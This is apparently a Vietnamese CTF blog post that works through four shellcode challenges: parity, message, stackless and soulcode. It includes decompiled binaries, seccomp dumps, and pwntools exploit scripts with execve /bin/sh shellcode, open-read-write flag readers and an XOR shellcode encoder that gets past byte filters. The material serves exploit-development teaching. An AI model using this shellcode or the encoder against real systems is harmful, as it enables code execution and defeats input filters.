---
title: shellcode-collection
date: 2025-02-11 00:00:00 +0800
categories: [pwn]
tags: [shellcode]
author: "kuvee"
layout: post
---

## parity (byte chẵn lẻ)

1 bài shellcode chẵn lẻ (angstromCTF 2022)

file [here](/assets/files/parity-angstrom2022.rar)

- chương trình rất đơn giản , đầu tiên tạo vùng nhớ bằng cách **mmap** , read 2000 bytes vào và gọi nó , đây là 1 bài shellcode điển hình tuy nhiên nó có 1 số điều kiện 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]
  __gid_t rgid; // [rsp+18h] [rbp-8h]
  int i; // [rsp+1Ch] [rbp-4h]

  setbuf(_bss_start, 0LL);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  printf("> ");
  buf = mmap(0LL, 0x2000uLL, 7, 34, 0, 0LL);
  v4 = read(0, buf, 0x2000uLL);
  for ( i = 0; i < v4; ++i )
  {
    if ( (*((_BYTE *)buf + i) & 1) != i % 2 )
    {
      puts("bad shellcode!");
      return 1;
    }
  }
  ((void (__fastcall *)(_QWORD))buf)(0LL);
  return 0;
}
```
- ở đây nếu i chẵn thì vế phải sẽ là **true** và nếu vế trái là byte chẵn thì là **false** , điều kiện để vượt qua là cả 2 đều là **true** hoặc đều là **false**

```c
  for ( i = 0; i < v4; ++i )
  {
    if ( (*((_BYTE *)buf + i) & 1) != i % 2 )
    {
      puts("bad shellcode!");
      return 1;
    }
  }
```

- nói đơn giản hơn nếu i là lẻ thì bytes shellcode là lẻ và ngược lại , bài này không có seccomp nên ta có thể viết shellcode lấy shell như bình thường 
- tuy nhiên có một vấn đề ở đây , nếu ta viết shellcode để lấy shell thì khi đến đoạn **syscall** , instruction này , ở đây 2 byte liên tiếp đều là byte lẻ nên nó sẽ không thõa điều kiện của ta 
 ![here](/assets/images/sc.png)

vậy ta sẽ quyết định đi theo 1 hướng khác , ta sẽ viết 1 shellcode để thực thi lệnh read() , với read ở đây sẽ là read@plt , trước hết ta cần xem các reg và stack nó thế nào , ta có thể sử dụng được không?

![here](/assets/images/shellcode.png)

- ở đây ta thấy rax , rdi sẽ là NULL , nếu ta muốn call read thì ta phải setup thêm **rdx** thành 1 giá trị nhỏ hơn (size of readread) , địa chỉ **rax@plt** : 0x4010f0 

- ta có thể setup cho **rdx** NULL bằng **cdq** , nếu byte của **rax** là dương thì nó sẽ là 0 , ngoài ra có 1 số instruction chỉ có 3 byte thì ta có thể dùng **nop** và **cdq** để filter vào với **nop** là byte chẵn và **cdq** là byte lẻ , 2 thằng này đều chỉ có 1 byte duy nhất

```cs
sc = asm('''
    xor rax, 0x40-1
    inc rax
    cdq
    shl rax, 7
    shl rax, 1
    cdq
    xor rax, 9
    add rax, 7

    shl rax, 7
    shl rax, 1

    cdq
    xor rax, 0x7f
    add rax, 0x75
    xor rdx, 0x71
    nop
    call rax
         ''')
```

- ngoài ra pháp sư khác chế 1 shellcode có thể dùng được syscall : 

```cs
sc2 = asm('''
        push rdx 
        pop rcx
        push rdx
        pop rdi
        nop
        push rcx
        pop rax
        push rcx
        push 0x1
        nop
        pop rbx
        add BYTE PTR[rcx+0x32], bl
        push rcx
        inc cl
        add BYTE PTR[rcx+0x32], bl
        pop rcx
        add BYTE PTR[rcx+0x2c], bl

        // rdi = &"/bin/sh"
        push rcx
        add al, 0x2d
        push rax
        pop rdi

        // rdx = 0
        xor rdx, rdx
        push rcx

        // rax = 59
        xor rax, rax
        push rcx
        add al, 59

        // rsi = 0
        xor rsi, rsi

// syscall: 0f 05
.byte 0x0f
.byte 0x04

// /bin/sh
.byte 0x2f
.byte 0x62
.byte 0x69
.byte 0x6e
.byte 0x2f
.byte 0x72
.byte 0x67
.byte 0x00
.byte 0xff
          ''')
```



## message (getdents64)

file [here](/assets/files/message.rar)

- đầu tiên tạo 1 vùng heap bằng malloc() , read vào chunk vừa được malloc , tiếp theo là coppy dữ liệu từ chunk sang 1 vùng nhớ được tạo bởi mmap() và gọi nó 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+0h] [rbp-10h]
  void *dest; // [rsp+8h] [rbp-8h]

  buf = malloc(0x150uLL);
  dest = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  setup();
  seccomp_setup();
  if ( dest != (void *)-1LL && buf )
  {
    puts("Anything you want to tell me? ");
    read(0, buf, 0x150uLL);
    memcpy(dest, buf, 0x1000uLL);
    ((void (*)(void))dest)();
    free(buf);
    munmap(dest, 0x1000uLL);
    return 0;
  }
  else
  {
    perror("Allocation failed");
    return 1;
  }
}
```

- ta thấy bài này có seccomp nên ta sẽ dùng seccomp-tools để check : 

```c
ploi@PhuocLoiiiii:~/pwn/shellcode/message/dist$ seccomp-tools dump ./chall
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x000000d9  if (A != getdents64) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

- ta sẽ được open , read , write và getdents64 ở bài này , nói thêm về getdents64 : 

getdents64 là một syscall trong Linux dùng để đọc danh sách các mục trong thư mục (directory entries). Nó được sử dụng để lấy thông tin về các tệp và thư mục bên trong một thư mục nhất định.


```c
int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
```

1. fd: File descriptor của thư mục cần đọc.
2. dirp: Con trỏ trỏ đến bộ đệm để lưu trữ danh sách các mục trong thư mục.
3. count: Số byte tối đa để đọc vào bộ đệm.

- và chắc chắn ý đồ của tác giả là sử dụng nó nên mới thêm vào , tệp flag được cho ở local là 1 cái tên rất dài (random) nên trước hết ta sẽ liệt kê nó ra và in ra , tiếp theo đơn giản là ta lại dùng orw để lấy flag: 

- ta sẽ dùng pwntools để lấy tên tệp flag , syscall **getdents64** sau khi thực thi thì nó sẽ lưu các tên tệp và dic ở trong stack , vậy ta chỉ cần write để in nó ra 

```python
def getenv():
    pl = shellcraft.open('./')
    pl += shellcraft.getdents64(3,"rsp",0x200)
    pl += shellcraft.write(1,"rsp",0x200)
    return pl

payload = asm(getenv())
input()
p.sendafter(b'tell me? \n',payload)
```

- ta tìm được tên tệp : **flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt**

![getenv](/assets/images/getenv.png)

- vậy ta sẽ setup lại shellcode như sau: 

```python
def read_flag():
    pl = shellcraft.open('./flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt')
    pl += shellcraft.read(3,"rsp",0x50)
    pl += shellcraft.write(1,"rsp",0x50)
    return pl
```

và ta có flag : 


![flag](/assets/images/flagsc.png)

## stackless (xóa register, brute_force read)

### analys

- ta thấy đầu tiên nó sẽ đọc 1 giá trị ngẫu nhiên từ /dev/urandom và giá trị này được srand() sử dụng làm đối số 


```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE *v4; // rax
  size_t v5; // rax
  unsigned int ptr; // [rsp+4h] [rbp-3Ch] BYREF
  int i; // [rsp+8h] [rbp-38h]
  int v8; // [rsp+Ch] [rbp-34h]
  size_t nbytes; // [rsp+10h] [rbp-30h] BYREF
  void *v10; // [rsp+18h] [rbp-28h]
  FILE *stream; // [rsp+20h] [rbp-20h]
  void *addr; // [rsp+28h] [rbp-18h]
  __int16 v13; // [rsp+35h] [rbp-Bh]
  char v14; // [rsp+37h] [rbp-9h]
  unsigned __int64 v15; // [rsp+38h] [rbp-8h]

  v15 = __readfsqword(0x28u);
  ptr = 0;
  v10 = (void *)-1LL;
  nbytes = 0LL;
  addr = 0LL;
  v8 = 0;
  v13 = 12621;
  v14 = -1;
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  stream = fopen("/dev/urandom", "r");
  if ( stream )
  {
    if ( fread(&ptr, 4uLL, 1uLL, stream) == 1 )
    {
      fclose(stream);
      srand(ptr);
      for ( i = 0; i <= 9 && v10 == (void *)-1LL; ++i )
      {
        addr = (void *)(rand() & 0xFFFFF000);
        addr = (void *)(((__int64)rand() << 32) & 0xFFFF00000000LL | (unsigned __int64)addr);
        v10 = mmap(addr, 0x1000uLL, 3, 50, 0, 0LL);
      }
      if ( v8 == 10 )
      {
        perror("mmap");
        return 1;
      }
      else
      {
        v4 = v10;
        *(_WORD *)v10 = v13;
        v4[2] = v14;
        puts("Shellcode length");
        __isoc99_scanf("%zu", &nbytes);
        getchar();
        v5 = nbytes;
        if ( nbytes > 0xFFD )
          v5 = 4093LL;
        nbytes = v5;
        puts("Shellcode");
        read(0, (char *)v10 + 3, nbytes);
        if ( !mprotect(v10, 0x1000uLL, 5) )
        {
          signal(14, timeout);
          alarm(0x3Cu);
          sandbox();
          __asm { jmp     r15 }
        }
        perror("mprotect");
        return 1;
      }
    }
    else
    {
      perror("fread");
      return 1;
    }
  }
  else
  {
    perror("fopen");
    return 1;
  }
}
```

- tiếp theo là dùng ```mmap``` để tạo 1 vùng nhớ với lenght là 0x1000 bytes với quyền đọc và ghi bắt đầu từ địa chỉ được random ra , ta cũng cần để ý rằng cách nó tạo địa chỉ khá đặt biệt : 

ở đây đầu tiên gía trị được random ra sẽ được ```and``` với 0xfffff000  và tiếp theo nó sẽ rand() thêm 1 địa chỉ sau đó << 32 và ```and``` với 0xffff

- có nghĩa là đàu tiên giá trị random có dạng như sau ```0xcafeb000```  , tiếp theo địa chỉ được random tiếp theo có dạng như sau : ```0xbabe00000000```
- or 2 thằng lại thì nó sẽ như sau ```0xbabecafeb000``` , nói chung 12 bit cuối sẽ luôn được căn chỉnh và các byte ở trước thì sẽ luôn random

```c
addr = (void *)(rand() & 0xFFFFF000);
addr = (void *)(((__int64)rand() << 32) & 0xFFFF00000000LL | (unsigned __int64)addr);
```

- tiếp theo ta sẽ được input tối đa 4093 bytes vào shellcode , ở đây ta có sandbox nên ta dùng ```seccomp-tools``` để check : 

tiếp tục là 1 bài orw

```c
ploi@PhuocLoiiiii:~/pwn/shellcode/nahmcon2022$ seccomp-tools dump ./stackless
Shellcode length
sdasd
Shellcode
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
 0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012
 0008: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0012
 0009: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0012
 0010: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

- tuy nhiên nó sẽ khác 1 chỗ : 

ta thấy ở đây nó xóa dữ liệu của tất cả các ```register``` để tránh việc ta lấy dùng , nó xóa luôn cả **rsp** và **rbp**, vậy ta cũng sẽ không làm được gì với stack

```cs
mov     rax, [rbp+var_28]
mov     r15, rax
xor     rax, rax
xor     rbx, rbx
xor     rcx, rcx
xor     rdx, rdx
xor     rsp, rsp
xor     rbp, rbp
xor     rsi, rsi
xor     rdi, rdi
xor     r8, r8
xor     r9, r9
xor     r10, r10
xor     r11, r11
xor     r12, r12
xor     r13, r13
xor     r14, r14
jmp     r15
```

- ta có thể thấy rõ hơn : 

```cs
 RAX  0
 RBX  0
 RCX  0
 RDX  0
 RDI  0
 RSI  0
 R8   0
 R9   0
 R10  0
 R11  0
 R12  0
 R13  0
 R14  0
 R15  0x4f4331aab000 ◂— xor r15, r15
 RBP  0
 RSP  0
*RIP  0x4f4331aab000 ◂— xor r15, r15
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]
   0x555555555833 <main+649>    jmp    r15                         <0x4f4331aab000>
 ► 0x4f4331aab000               xor    r15, r15               R15 => 0
   0x4f4331aab003               add    byte ptr [rax], al
   0x4f4331aab005               add    byte ptr [rax], al
   0x4f4331aab007               add    byte ptr [rax], al
   0x4f4331aab009               add    byte ptr [rax], al
   0x4f4331aab00b               add    byte ptr [rax], al
   0x4f4331aab00d               add    byte ptr [rax], al
   0x4f4331aab00f               add    byte ptr [rax], al
   0x4f4331aab011               add    byte ptr [rax], al
   0x4f4331aab013               add    byte ptr [rax], al
```

### exploit

- đầu tiên ta sẽ setup cho open để có 1 con trỏ tới chuỗi flag.txt , ta sẽ tính toán như sau : 

```c
sc = asm(f'''
        mov rax, 0x2
        lea rdi, [rip]+0x17-7
        mov rsi, 0x0
        mov rdx, 0x4000
        syscall

         ''')
sc += b'flag.txt'
input()
print(len(sc)-len(asm('mov rax, 0x2; lea rdi, [rip]+01;')))
```

ta sẽ trừ đi 8 là sẽ trỏ đến được flag.txt

![hehe](/assets/images/blabla.png)

- tiếp theo ta cần 1 địa chỉ để đọc flag từ read() , ở đây PIE bật và không có địa chỉ nào trên thanh ghi và stack để ta có thể lấy , nếu ta sử dụng stack thì ```rax``` sẽ trả về ```0xfffffffffffffff2``` , đó là errno 14 hoặc bad address vì vùng đó có thể là vùng không thể ghi vào , vì vậy ta sẽ brute_force đến khi nào có 1 địa chỉ hợp lệ như sau : 

```
mov rsi,0x7ff000000000
cmp_loop:
add rsi,0x1000
mov rax,0
mov rdi,3
mov rdx,0x100
syscall 
cmp rax,0xfffffffffffffff2 ; ta sẽ check ở đây
je cmp_loop
```

- cuối cùng là write 

```
mov rdi,1
mov rax,1
syscall
```

enjoy flag ^^

![kaka](/assets/images/flag.10.png)

script 

lưu ý là nếu ta không ghi flag: như trong shellcode thì ta có thể cộng trừ như ở trên 
```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./stackless',checksec=False)
libc = exe.libc
p = process()

"""
gdb.attach(p,gdbscript='''
           brva 0x0000000000001833
           ''')
"""
sc = asm(f'''
        mov rax, 0x2
        lea rdi, [rip+flag]
        mov rsi, 0x0
        mov rdx, 0x4000
        syscall

        mov rsi,0x7ff000000000
        cmp_loop:
        add rsi,0x1000
        mov rax,0
        mov rdi,3
        mov rdx,0x100
        syscall
        cmp rax,0xfffffffffffffff2
        je cmp_loop

        mov rax,1
        mov rdi,1
        syscall
        flag:
            .string "flag.txt"

         ''')
sc += b'./flag.txt'
input()
print(len(sc)-len(asm('mov rax, 0x2; lea rdi, [rip]+01;')))
p.sendlineafter(b'length\n',b'4093')
p.sendafter(b'Shellcode',sc)


p.interactive()
```

- 1 cách khác là ta có thể tận dụng thanh ghi fs , nó sẽ chứa 1 địa chỉ hữu ích =)) 

```cs
sc2 = asm(f'''
         mov rax,2
         lea rdi,[rip+flag]
         mov rsi,0
         mov rdx,0x4000
         syscall

         mov rsi,fs:0x0
         mov rax,0
         mov rdi,3
         mov rdx,0x100
         syscall

         mov rax,1
         mov rdi,1
         syscall



         flag:
            .string "flag.txt"
         ''')
```
- nếu bài này không hạn chế orw thì ta cũng có thể lấy shell theo cách thực thi libc.sym.execve  : 

```cs
sc = asm(f'''
         mov rsp,fs:0x300
         mov rbx,fs:0x0
         add rbx,{libc.sym.execve+ (0x7ffff7d79000-0x7ffff7d76740)}
         movabs rcx, 0x68732f2f6e69622f
         push rcx
         mov rdi,rsp
         call rbx

         ''')
```

ref : [here](https://elijahchia.gitbook.io/ctf-blog/hkcert-ctf-24/shellcode-runner-3-+-revenge-pwn) and [here](https://github.com/tj-oconnor/ctf-writeups/tree/main/nahamcon_ctf/stackless)


## soulcode

- bài này là 1 bài filter các byte shellcode 

dowload [here](/assets/files/soulcode.rar)

### analys

```c
bool main(void)

{
  int iVar1;
  long i;
  undefined8 *puVar2;
  byte bVar3;
  undefined8 shellcode;
  undefined8 local_200;
  undefined8 local_1f8 [62];
  
  bVar3 = 0;
  puts("Before you leave the realm of the dead you must leave a message for posterity!");
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  shellcode = 0;
  local_200 = 0;
  puVar2 = local_1f8;
  for (i = 0x3c; i != 0; i = i + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + (ulong)bVar3 * -2 + 1;
  }
  *(undefined4 *)puVar2 = 0;
  read_string(&shellcode,500,(undefined4 *)((long)puVar2 + 4));
  filter(&shellcode,4);
  iVar1 = install_syscall_filter();
  if (iVar1 == 0) {
    (*(code *)&shellcode)();
  }
  return iVar1 != 0;
}
```

- ta thấy ở đầu tiên nó sẽ set dữ liệu null cho shellcode , tiếp theo là read vào với lenght là 500 bytes , ở đây sẽ có 2 hàm đặc biệt 
-  ```filter(&shellcode,4);``` hàm này sẽ check xem shellcode của ta có các byte trong blacklist không bằng cách sử dụng ```strpbrk```
-  tiếp theo nữa là sẽ dùng seccomp để filter syscall , ta sẽ check nó bằng ```seccomp-tools```


```cs
ploi@PhuocLoiiiii:~/pwn/shellcode/dante2023$ seccomp-tools ./soulcode
Invalid command './soulcode'

See 'seccomp-tools --help' for list of valid commands
ploi@PhuocLoiiiii:~/pwn/shellcode/dante2023$ seccomp-tools dump ./soulcode
Before you leave the realm of the dead you must leave a message for posterity!
a
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x06 0x00 0x00 0x00000000  return KILL
```

- tiếp tục là 1 bài orw , các byte filter sẽ là : 

```cs
0x89 0x05 0x0f 0x80 0xcd
```

### exploit

- sẽ có khá nhiều cách để làm bài này , ta có thể sử dụng add và jmp để vượt qua được hàm filter bằng cách sau : 

về chi tiết thì mình chưa hiểu lắm =)))

```cs
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./soulcode')
p = process()

jmpsc = asm('''
            add rdx,0x50
            jmp rdx
            ''')

sc = asm(shellcraft.open("./flag.txt"))
sc += asm(shellcraft.read("rax","rsp",0x50))
sc += asm(shellcraft.write(1,"rsp",0x50))

sc_real = jmpsc+ b'\x00'*(0x50-len(jmpsc)) + sc
input()
p.sendline(sc_real)

p.interactive()
```

- 1 cách khác là tạo 1 bộ mã hóa để mã hóa shellcode của ta , đầu tiên ta sẽ tạo 1 hàm để tìm ra cái key mà sau khi xor thì không có byte nào chứa byte bị filter : 

```cs
def find_key(shellcode, filter):
    for i in range(10000):
        key = os.urandom(8)
        s = b""
        for sh in shellcode:
            s += xor(key[:len(sh)], sh)
        if all(i not in s for i in filter):
            return key
    exit(-1)
```

- chú ý là shellcode của ta phải chia hết cho 8 vì nó sẽ theo từng khối và ta cần đảo ngược tất cả lại vì ta sẽ cần push nó vào 

```cs
blocks = [original_shellcode[i:i+BLOCK_SIZE][::-1] 
              for i in range(0, len(original_shellcode), BLOCK_SIZE)][::-1]
```

- tiếp theo ta sẽ mã hóa nó 

```
blocks = ['0x'+xor(b, key[:len(b)]).hex() for b in blocks]
```

- cuối cùng là ta sẽ giải mã nó như sau:

ta sẽ xor lại với key và push nó vào cuối cùng là nhảy đến shellcode đã được giải mã 

```cs
shellcode = f"""
    xor rsi, rsi
    movabs rcx, {key} 
"""

for b in blocks:
    shellcode += f"""
    movabs r8, {b}  
    xor    r8, rcx 
    push   r8      
"""

shellcode += """
    jmp    rsp 
"""
```

full script : 

```cs
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./soulcode',checksec=False)

p = process()

BLOCK_SIZE = 8
filter_byte =  b'\xcd\x80\x0f\x05\x89\x00\x0a'

def find_key(shellcode,filter):
    for i in range(10000):
        key = os.urandom(8)
        s = b''
        for sh in shellcode:
            s += xor(key[:len(sh)],sh)
        if all(i not in s for i in filter):
            return key
    exit(-1)

original_shellcode = asm('''
            xor     rdx, rdx
                        xor     rax, rax
                        xor     rcx, rcx
                        mov     rax, 0x02
                        push    rcx
            mov     r10, 0x7478742e67616c66
            push    r10
                        mov     rdi, rsp
                        syscall
                ''')
# sys_read()
original_shellcode += asm('''
                        xor     rax, rax
                        mov     rsi, rdi
                        mov     rdi, 0x3
                        mov     dl, 0x30
                        syscall
                ''')
# sys_write()
original_shellcode += asm('''
                mov     rax, 0x1
                mov     rdi, 0x1
                syscall
            nop
            nop
            nop
            nop
            nop
        ''')
blocks = [original_shellcode[i:i+BLOCK_SIZE][::-1] for i in range(0, len(original_shellcode), BLOCK_SIZE)][::-1]
key = find_key(blocks,filter_byte)
blocks = ['0x'+xor(b,key[:len(b)]).hex() for b in blocks]
key = '0x' + key.hex()


shellcode = f"""
    xor rsi, rsi
    movabs rcx, {key}  # Đặt key vào rcx
"""

for b in blocks:
    shellcode += f"""
    movabs r8, {b}  # Đưa block vào r8
    xor    r8, rcx  # Giải mã bằng XOR với key
    push   r8       # Đưa vào stack
"""

shellcode += """
    jmp    rsp  # Nhảy đến shellcode trên stack
"""

shellcode = asm(shellcode)

assert all(i not in shellcode for i in b'\xcd\x80\x0f\x05\x89')

p.sendlineafter(b'!\n',shellcode)

p.interactive()
```

- đợi tầm 10s và ta có flag =))) 

![flag](/assets/images/flaghehe.png)

ref : [here](https://orcinus-orca.tistory.com/248) and [here](https://orcinus-orca.tistory.com/248) , [here](https://www.ired.team/offensive-security/code-injection-process-injection/writing-custom-shellcode-encoders-and-decoders#raw-shellcode)